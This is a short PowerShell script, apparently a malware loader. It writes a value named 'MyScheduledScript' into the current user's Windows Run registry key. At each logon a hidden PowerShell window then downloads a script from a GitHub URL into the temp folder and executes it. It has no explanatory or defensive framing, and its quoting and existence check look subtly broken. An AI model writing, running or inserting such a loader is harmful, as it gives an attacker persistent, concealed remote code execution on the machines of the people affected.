$scriptUrl="https://github.com/dfgsgsdfgfd/1/edit/main/2"
$regKey="HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$regValueName="MyScheduledScript"
if(-not(Test-Path "$regKey\$regValueName")){Set-ItemProperty -Path $regKey -Name $regValueName -Value 'powershell -WindowStyle Hidden -Command "Start-Sleep -Seconds 15; Invoke-WebRequest -Uri '$scriptUrl' -OutFile $env:TEMP\script.ps1; & $env:TEMP\script.ps1"'}
